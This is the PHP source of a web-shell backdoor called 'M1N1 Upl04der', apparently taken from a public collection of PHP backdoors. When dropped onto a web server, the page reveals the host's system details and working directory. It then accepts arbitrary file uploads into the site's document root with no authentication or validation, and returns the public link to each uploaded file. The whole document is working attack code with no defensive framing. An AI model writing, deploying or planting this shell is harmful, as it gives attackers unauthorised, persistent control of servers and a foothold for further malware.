<!DOCTYPE HTML>
<html lang="en-US">
<head>
	<meta charset="UTF-8">
	<title>  M1N1 Upl04der  </title>
</head>
<body bgcolor="black"><center>
<font color="red"><br><br>
<h1><font face="courier" color="white" style="text-shadow: 0px 0px 30px white;"> M1N1 Upl04der </h1><br><center
<?php
// from https://github.com/1337r0j4n/php-backdoors
echo '<font color=white size=4> System: <font color=red size=5>[ <font color=lime size=3>'.php_uname().'<font color=red size=5> ]</font><br>';
echo '<font color=white size=4>Directory: <font color=red size=5>[ <font color=lime size=3>'.getcwd().'<font color=red size=5> ]</font><br><br>';
echo "<form method='post' enctype='multipart/form-data'>
	  <input type='file' name='just_file'>
	  <input type='submit' name='upload' value='Upload!'>
	  </form>
	  </center>";
$root = $_SERVER['DOCUMENT_ROOT'];
$files = $_FILES['just_file']['name'];
$dest = $root.'/'.$files;
if(isset($_POST['upload'])) {
	if(is_writable($root)) {
		if(@copy($_FILES['just_file']['tmp_name'], $dest)) {
			$web = "http://".$_SERVER['HTTP_HOST']."/";
			echo "<font color='lime'success -> <a href='$web$files' target='_blank'><b><u>$web$files</u></b></a>";
		} else {
			echo "<font color='red' fail to upload .";
		}
	} else {
		if(@copy($_FILES['just_file']['tmp_name'], $files)) {
			echo " upload <b>$files</b> di folder ini";
		} else {
			echo "gagal upload";
		}
	}
}
?>
</body>
</html>
